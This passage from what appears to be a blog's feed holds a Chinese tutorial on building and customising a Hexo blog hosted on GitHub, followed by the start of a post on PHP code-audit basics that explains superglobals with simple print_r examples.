title="上传前的配置"></a>上传前的配置</h4><p>配置站点配置文件_config.yml中的deploy部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:yourname/yourname.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><h4 id="安装上传插件"><a href="#安装上传插件" class="headerlink" title="安装上传插件"></a>安装上传插件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h4 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h4><p>在hexo根目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>会将有所改动的内容全部提交至github</p><h4 id="常用hexo命令"><a href="#常用hexo命令" class="headerlink" title="常用hexo命令"></a>常用hexo命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;postName&quot;   #新建文章</span><br><span class="line">hexo new page &quot;pageName&quot;   #新建页面</span><br><span class="line">hexo generate   #生成静态页面至public目录</span><br><span class="line">hexo server   #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）</span><br><span class="line">hexo deploy   #部署到GitHub</span><br><span class="line">hexo help   #查看帮助</span><br><span class="line">hexo version   #查看Hexo的版本</span><br><span class="line">hexo clean   #清除缓存</span><br><span class="line"></span><br><span class="line">缩写：</span><br><span class="line">hexo n == hexo new</span><br><span class="line">hexo g == hexo generate</span><br><span class="line">hexo s == hexo server</span><br><span class="line">hexo d == hexo deploy</span><br><span class="line"></span><br><span class="line">组合命令：</span><br><span class="line">hexo s -g#生成并本地预览</span><br><span class="line">hexo d -g#生成并上传</span><br></pre></td></tr></table></figure><h3 id="0x07-更改默认hexo主题及优化"><a href="#0x07-更改默认hexo主题及优化" class="headerlink" title="0x07 更改默认hexo主题及优化"></a>0x07 更改默认hexo主题及优化</h3><h4 id="主题下载"><a href="#主题下载" class="headerlink" title="主题下载"></a>主题下载</h4><p>进入hexo根目录</p><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><p>执行完成后会在hexo\themes\ 目录下生成next目录</p><p>next目录下也会存在一个_config.yml文件，这是next主题的主配置文件，以后我们称为主题配置文件</p><p>你也可以自己更换自己喜欢的主题<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a> ，官网有很多主题，</p><h4 id="主题应用"><a href="#主题应用" class="headerlink" title="主题应用"></a>主题应用</h4><p>配置站点配置文件</p><p>寻找theme字段，将其值修改为next（next前都有一个空格，否则会报错）</p><h4 id="主题预览"><a href="#主题预览" class="headerlink" title="主题预览"></a>主题预览</h4><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean#清除缓存</span><br><span class="line">hexo g#重新生成代码</span><br><span class="line">hexo s#部署到本地</span><br></pre></td></tr></table></figure><p>浏览器访问 <a href="http://127.0.0.1:4000/" target="_blank" rel="noopener">http://127.0.0.1:4000</a> 查看效果</p><h3 id="0x08-主题简单优化"><a href="#0x08-主题简单优化" class="headerlink" title="0x08 主题简单优化"></a>0x08 主题简单优化</h3><h4 id="设置布局"><a href="#设置布局" class="headerlink" title="设置布局"></a>设置布局</h4><p>主题配置文件中</p><p>寻找 Scheme 字段，next提供三种默认主题布局，将你想使用的布局取消注释即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#scheme: Muse</span><br><span class="line">#scheme: Mist</span><br><span class="line">scheme: Pisces</span><br></pre></td></tr></table></figure><ul><li>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</li><li>Mist - Muse 的紧凑版本，整洁有序的单栏外观</li><li>Pisces - 双栏 Scheme，小家碧玉似的清新</li></ul><h4 id="设置显示语言"><a href="#设置显示语言" class="headerlink" title="设置显示语言"></a>设置显示语言</h4><p>站点配置文件中</p><p>寻找<code>language</code> 字段，设置其值为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">language: zh-Hans</span><br></pre></td></tr></table></figure><p>语言文件位于hexo\themes\next\languages目录下</p><h4 id="设置菜单"><a href="#设置菜单" class="headerlink" title="设置菜单"></a>设置菜单</h4><p>主题配置文件中</p><p>寻找menu字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || home     #主页</span><br><span class="line">  categories: /categories/ || th  #分类页</span><br><span class="line">  tags: /tags/ || tags     #标签页</span><br><span class="line">  about: /about/ || user     #关于页</span><br><span class="line">  #archives: /archives/ || archive  #归档页</span><br><span class="line">  #schedule: /schedule/ || calendar</span><br><span class="line">  #sitemap: /sitemap.xml || sitemap</span><br><span class="line">  #commonweal: /404/ || heartbeat     #公益404</span><br></pre></td></tr></table></figure><p>除主页与归档页外，其余页面需要手动创建</p><p>每行中 || 后的内容为指定此menu的图标</p><h4 id="添加标签页"><a href="#添加标签页" class="headerlink" title="添加标签页"></a>添加标签页</h4><p><strong>新建页面</strong></p><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\tags目录中生成index.md文件</p><p><strong>设置页面类型</strong></p><p>修改此index.md文件为(添加type行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: tags</span><br><span class="line">date: 2016-11-15 19:10:05</span><br><span class="line">type: &quot;tags&quot;</span><br></pre></td></tr></table></figure><p><strong>设置具体博客文章tags</strong></p><p>对于hexo\source_post目录下具体博客文章设置tags(设置tags行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: 基于Hexo和Github搭建博客</span><br><span class="line">date: 2016-11-09</span><br><span class="line">tags: [npm, hexo, github]</span><br></pre></td></tr></table></figure><h4 id="添加分类页面"><a href="#添加分类页面" class="headerlink" title="添加分类页面"></a>添加分类页面</h4><p><strong>新建页面</strong></p><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\categories目录中生成index.md文件</p><p><strong>设置页面类型</strong></p><p>修改此index.md文件为(添加categories行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: categories</span><br><span class="line">date: 2016-11-15 19:11:13</span><br><span class="line">type: &quot;categories&quot;</span><br></pre></td></tr></table></figure><p><strong>设置具体博客文章categories</strong></p><p>对于hexo\source_post目录下具体博客文章设置categories(设置categories行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">title: 基于Hexo和Github搭建博客</span><br><span class="line">date: 2016-11-09</span><br><span class="line">tags: [npm, hexo, github]</span><br><span class="line">categories: 搭建博客</span><br></pre></td></tr></table></figure><h4 id="添加关于页面"><a href="#添加关于页面" class="headerlink" title="添加关于页面"></a>添加关于页面</h4><p><strong>添加页面</strong></p><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page about</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\about目录中生成index.md文件</p><p><strong>修改index.md文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">title: about</span><br><span class="line">date: 2016-11-15 19:08:50</span><br><span class="line">## 关于我</span><br><span class="line"></span><br><span class="line">一只学习的小菜鸟，欢迎分享知识。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">QQ：</span><br><span class="line">Email:</span><br></pre></td></tr></table></figure><h4 id="设置站内搜索"><a href="#设置站内搜索" class="headerlink" title="设置站内搜索"></a>设置站内搜索</h4><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure><p>站点配置文件中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure><h3 id="0x09-其他设置"><a href="#0x09-其他设置" class="headerlink" title="0x09 其他设置"></a>0x09 其他设置</h3><h4 id="hexo-首页文章只显示一部分"><a href="#hexo-首页文章只显示一部分" class="headerlink" title="hexo 首页文章只显示一部分"></a>hexo 首页文章只显示一部分</h4><p>在博客文章适当位置添加<code>&lt;!--more--&gt;</code> 标记即可</p><h4 id="网站底部字数统计"><a href="#网站底部字数统计" class="headerlink" title="网站底部字数统计"></a>网站底部字数统计</h4><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure><p>hexo\themes\next\/layout_partials\footer.swig文件中末尾添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;theme-info&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;powered-by&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;span class=&quot;post-count&quot;&gt;博客全站共&#123;&#123; totalcount(site) &#125;&#125;字&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h4 id="修改文章底部的带-号的标签"><a href="#修改文章底部的带-号的标签" class="headerlink" title="修改文章底部的带#号的标签"></a>修改文章底部的带#号的标签</h4><p>修改hexo\themes\next\layout_macro\post.swig文件，搜索<code>rel=&quot;tag&quot;&gt;#</code> ，改为<code>&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code></p><h4 id="在每篇文章末尾统一添加“本文结束”标记"><a href="#在每篇文章末尾统一添加“本文结束”标记" class="headerlink" title="在每篇文章末尾统一添加“本文结束”标记"></a>在每篇文章末尾统一添加“本文结束”标记</h4><p>在hexo\themes\next\layout_macro目录下，新建<code>passage-end-tag.swig</code> ，并添加如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt;感谢您的阅读-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>接着打开hexo\themes\next\layout_macro\post.swig<code>文件，在</code>post-body 之后添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &#123;% if not is_index %&#125;</span><br><span class="line">    &#123;% include &apos;passage-end-tag.swig&apos; %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p><img src="\\images\pasted-9.png\" alt="upload successful"></p><p>打开主题配置文件，在末尾添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 文章末尾添加“本文结束”标记</span><br><span class="line">passage_end_tag:</span><br><span class="line">  enabled: true</span><br></pre></td></tr></table></figure><h3 id="0x010-访问线上博客"><a href="#0x010-访问线上博客" class="headerlink" title="0x010 访问线上博客"></a>0x010 访问线上博客</h3><h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><p>hexo clean<br>hexo g<br>hexo d<br>浏览器访问<a href="https://yourname.github.io" target="_blank" rel="noopener">https://yourname.github.io</a> （yourname是你的github用户名）</p><p>设置域名解析<br>ping一下你的博客域名，获取其IP地址</p><p><img src="\\images\pasted-12.png\" alt="upload successful"></p><p>在阿里云或腾讯云设置域名解析</p><p><img src="/images/pasted-10.png" alt="upload successful"></p><p><img src="/images/pasted-11.png" alt="upload successful"></p><p>在Hexo目录下的source中建一个CNAME命名的文件夹(切记没有后缀)</p><p>右键新建txt文本-&gt;输入你购买的域名<a href="http://www.ainusers.top-&gt;保存关闭" target="_blank" rel="noopener">www.ainusers.top-&gt;保存关闭</a></p><p>然后快捷键F2或者右键该文本重命名-&gt;将.txt后缀去掉-&gt;会提示文件不可用继续确定即可<br><img src="/images/pasted-13.png" alt="upload successful"></p><h4 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h4><p><strong>进入hexo目录</strong></p><p>hexo clean<br>hexo g<br>hexo d<br>即可使用自定义域名访问博客，并且原博客域名也不会失效</p><h3 id="Hexo-Admin后台管理博客工具"><a href="#Hexo-Admin后台管理博客工具" class="headerlink" title="Hexo Admin后台管理博客工具"></a>Hexo Admin后台管理博客工具</h3><p>使用hexo+github确实非常方便管理自己的知识，但是缺点在于每次在本地使用markdown工具写完笔记，都要进行生成静态页面，然后本地预览或者上传github操作，操作非常繁琐。所以在这里配置使用Hexo Admin工具对博客进行管理，简化操作。</p><h4 id="Hexo-Admin介绍"><a href="#Hexo-Admin介绍" class="headerlink" title="Hexo Admin介绍"></a>Hexo Admin介绍</h4><p>官方网站：<a href="https://jaredforsyth.com/hexo-admin/" target="_blank" rel="noopener">https://jaredforsyth.com/hexo-admin/</a><br>属于hexo插件系列，使用B/S架构对博客进行后台管理</p><p><strong>安装</strong><br>进入/hexo目录git bash下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-admin</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-15.png" alt="upload successful"><br>访问hexo后台管理界面git bash下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server -d</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-16.png" alt="upload successful"></p><p>访问<a href="http://localhost:4000/即可访问本地博客" target="_blank" rel="noopener">http://localhost:4000/即可访问本地博客</a></p><p>访问<a href="http://localhost:4000/admin即可进入Hexo" target="_blank" rel="noopener">http://localhost:4000/admin即可进入Hexo</a> Admin后台管理界面</p><p>配置Hexo Admin<br>Settings选项下</p><p><img src="\\images\pasted-17.png\" alt="upload successful"></p><p>点击Setup authentification here</p><p><img src="\\images\pasted-18.png\" alt="upload successful"></p><p>配置你的Hexo Admin登陆账户及密码，以及加密cookies的字符串</p><p>下方会生成配置文件字段，将此复制到站点目录下_config.yml中</p><p>重启hexo server -d，再次访问<a href="http://localhost:4000/admin则需输入账号密码登陆。" target="_blank" rel="noopener">http://localhost:4000/admin则需输入账号密码登陆。</a></p><h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p><a href="https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html" target="_blank" rel="noopener">https://www.cnblogs.com/liuxianan/p/build-blog-website-by-hexo-github.html</a><br><a href="http://theme-next.iissnan.com/getting-started.html" target="_blank" rel="noopener">http://theme-next.iissnan.com/getting-started.html</a><br><a href="http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html" target="_blank" rel="noopener">http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html</a><br><a href="https://www.cnblogs.com/syd192/p/6074323.html" target="_blank" rel="noopener">https://www.cnblogs.com/syd192/p/6074323.html</a><br> <a href="https://blog.csdn.net/ainuser/article/details/77609180" target="_blank" rel="noopener">https://blog.csdn.net/ainuser/article/details/77609180</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;gitHub是一个面向&lt;a href=&quot;https://baike.baidu.com/item/%E5%BC%80%E6%BA%90/20720669&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;开源&lt;/a&gt;及私有&lt;a href=&quot;https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6/12053&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;软件&lt;/a&gt;项目的托管平台，因为只支持git 作为唯一的版本库格式进行托管，故名gitHub。 Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 &lt;a href=&quot;http://daringfireball.net/projects/markdown/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Markdown&lt;/a&gt;（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="搭建博客" scheme="http://yoursite.com/categories/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="博客" scheme="http://yoursite.com/tags/%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计 基础知识</title>
    <link href="http://yoursite.com/2018/08/08/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://yoursite.com/2018/08/08/PHP代码审计-基础知识/</id>
    <published>2018-08-08T03:04:00.000Z</published>
    <updated>2018-08-13T15:16:23.489Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文记录 PHP 代码审计的学习过程</p><p><a href="https://mp.csdn.net/mdeditor/81107149" target="_blank" rel="noopener">PHP 代码审计博客目录</a></p></blockquote><a id="more"></a> <h1 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h1><h2 id="1-1-测试运行环境"><a href="#1-1-测试运行环境" class="headerlink" title="1.1 测试运行环境"></a>1.1 测试运行环境</h2><p>安装 wamp</p><h2 id="1-2-PHP-编写工具"><a href="#1-2-PHP-编写工具" class="headerlink" title="1.2 PHP 编写工具"></a>1.2 PHP 编写工具</h2><ol><li>EditPlu</li><li>Notepad++</li><li>Zendstudio 10 <a href="https://pan.baidu.com/s/1ZLITLQh0zsXcVlTx-wsZRA?fid=1082316314302126" target="_blank" rel="noopener">百度云下载链接</a></li></ol><h2 id="1-3-代码审计工具"><a href="#1-3-代码审计工具" class="headerlink" title="1.3 代码审计工具"></a>1.3 代码审计工具</h2><p>Seay源代码审计系统 <a href="https://pan.baidu.com/s/1skEE2Bz?fid=143632393324465" target="_blank" rel="noopener">百度云下载链接</a></p><h2 id="1-4-代码审计平台"><a href="#1-4-代码审计平台" class="headerlink" title="1.4 代码审计平台"></a>1.4 代码审计平台</h2><ol><li>DVWA <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">GitHub 链接</a></li><li>ZVulDrill <a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="noopener">GitHub 链接</a></li></ol><h1 id="2-注释"><a href="#2-注释" class="headerlink" title="2. 注释"></a>2. 注释</h1><ol><li>单行注释 =&gt;  //单行注释</li><li>多行注释 =&gt;  /*多行注释*/</li></ol><h1 id="3-单引号和双引号"><a href="#3-单引号和双引号" class="headerlink" title="3. 单引号和双引号"></a>3. 单引号和双引号</h1><ol><li><p>单引号不解析变量</p></li><li><p>双引号解析变量</p><p>aaa=’123’</p><pre><code>echo &apos;$aaa&apos; =&gt; 结果为 $aaaecho &quot;$aaa&quot; =&gt; 结果为 123</code></pre></li></ol><h1 id="4-输出函数"><a href="#4-输出函数" class="headerlink" title="4. 输出函数"></a>4. 输出函数</h1><ol><li>echo 或者 print：最简单的输出方法</li><li>print_r、var_dump(var_export)、debug_zval_dump：输出变量数据值，特别是数组和对象数据</li><li>var_dump 会额外输出数据类型</li><li>print_r：输出格式很整齐，跟var_dump 的区别是没有类型数据，并且布尔值的 false 和 NULL 输出为空</li><li>var_export：所有的数据是可以作为组织好的变量输出的，都是能够作为直接赋值使用；需要注意的一点是, var_export 对于资源型的变量会输出NULL</li><li>debug_zval_dump：输出结果跟 var_dump 类似，唯一增加的一个值是 refcount，就是记录一个变量被引用了多少次，这是 php 的copy on write (写时复制) 的机制的一个重要特点。</li></ol><h1 id="5-超全局变量"><a href="#5-超全局变量" class="headerlink" title="5. 超全局变量"></a>5. 超全局变量</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">超全局变量——超全局变量是在全部作用域中始终可用的内置变量</span><br></pre></td></tr></table></figure><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><ol><li><p>在php 中可由用户操作的全局变量列表如下:</p><p>$GLOBALS — 引用全局作用域中可用的全部变量</p><pre><code>$_SERVER — 服务器和执行环境信息$_GET — HTTP GET 变量$_POST — HTTP POST 变量$_FILES — HTTP 文件上传变量$_REQUEST — HTTP Request 变量$_SESSION — Session 变量$_ENV — 环境变量$_COOKIE — HTTP Cookies</code></pre></li><li><p>已经被弃用的超全局变量</p><p>$_HTTP_COOKIE_VARS</p><pre><code>$_HTTP_ENV_VARS$_HTTP_GET_VARS$_HTTP_POST_FILES$_HTTP_POST_VARS$_HTTP_SERVER_VARS</code></pre></li></ol><h2 id="2-超全局变量示例"><a href="#2-超全局变量示例" class="headerlink" title="2. 超全局变量示例"></a>2. 超全局变量示例</h2><ol><li><p>$GLOBALS</p><h1 id="例一："><a href="#例一：" class="headerlink" title="例一："></a>例一：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$moon=&quot;1&quot;;</span><br><span class="line">echo $GLOBALS[&apos;moon&apos;];</span><br><span class="line">?&gt;</span><br><span class="line"># 显示结果为1</span><br><span class="line"></span><br><span class="line"># 例二</span><br><span class="line">&lt;?php</span><br><span class="line">function test()&#123;</span><br><span class="line">echo $moon=&quot;2&quot;;</span><br><span class="line">echo $GLOBALS[&apos;moon&apos;];</span><br><span class="line">&#125;</span><br><span class="line">$moon=&quot;1&quot;;</span><br><span class="line">test();</span><br><span class="line">?&gt;</span><br><span class="line"># 显示结果为 21 </span><br><span class="line"># 函数内部为局部变量，不被 $GLOBALS 所识别</span><br></pre></td></tr></table></figure></li><li><p>$_SERVER</p><p>test1.php</p><pre><code>&lt;?phpprint_r($_SERVER);?&gt;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test2.php</span><br><span class="line">&lt;?php</span><br><span class="line">$_SERVER=&apos;aaaaaa&apos;;</span><br><span class="line">print_r($_SERVER);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果为服务器的配置信息</p><p><img src="https://i.imgur.com/NxGTsQ1.png" alt=""></p><p>输出结果可以被覆盖</p><p><img src="https://i.imgur.com/W6GgqVz.png" alt=""></p></li><li><p>$_GET</p><p>test.php</p><pre><code>&lt;?phpprint_r($_GET);?&gt;</code></pre><p>输出结果为 URL 中的 GET 变量的数据</p><p><img src="https://i.imgur.com/30xFhlN.png" alt=""></p></li><li><p>$_POST</p><p>test.php</p><pre><code>&lt;?phpprint_r($_POST);?&gt;</code></pre><p>输出结果为 URL 中的 POET 变量的数据</p></li><li><p>$_FILES</p><ol><li>file.html<br><form action="test.php" method="post" enctype="multipart/form-data"><pre><code>&lt;lable for=&quot;file&quot;&gt;Filename:&lt;/lable&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;&lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;</code></pre><ol><li>test.php<br>&lt;?php<br>print_r($_FILES);<br>?&gt;</li></ol></form></li></ol><p>输出结果为提交的文件的信息</p><p><img src="https://i.imgur.com/0aqkmXB.png" alt=""></p></li><li><p>$_REQUEST</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">test1.php</span><br><span class="line">&lt;?php</span><br><span class="line">print_r($_REQUEST);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">test2.php</span><br><span class="line">&lt;?php</span><br><span class="line">$_REQUEST=&apos;aaaaaa&apos;;</span><br><span class="line">print_r($_REQUEST);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出结果可以被覆盖</span><br><span class="line"></span><br><span class="line">![](https://i.imgur.com/W6GgqVz.png)</span><br></pre></td></tr></table></figure><ol><li><p>$_SESSION</p><p>test1.php</p><pre><code>&lt;?phpprint_r($_SESSION);?&gt;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test2.php</span><br><span class="line">&lt;?php</span><br><span class="line">$_SESSION=&apos;aaaaaa&apos;;</span><br><span class="line">print_r($_SESSION);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果可以被覆盖</p><p><img src="https://i.imgur.com/W6GgqVz.png" alt=""></p></li><li><p>$_ENV</p><p>test1.php</p><pre><code>&lt;?phpprint_r($_ENV);?&gt;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">test2.php</span><br><span class="line">&lt;?php</span><br><span class="line">$_ENV=&apos;aaaaaa&apos;;</span><br><span class="line">print_r($_ENV);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">test3.php</span><br><span class="line">&lt;?php</span><br><span class="line">print_r($_ENV[&apos;OS&apos;]=&apos;bbbbbb&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果可以被覆盖</p><p><img src="https://i.imgur.com/W6GgqVz.png" alt=""></p><p><img src="https://i.imgur.com/XROLZ85.png" alt=""></p></li><li><p>$_COOKIE </p><p>test.php</p><pre><code>&lt;?phpprint_r($_COOKIE);?&gt;</code></pre><p>输出结果为 cookie 值</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文记录 PHP 代码审计的学习过程&lt;/p&gt;
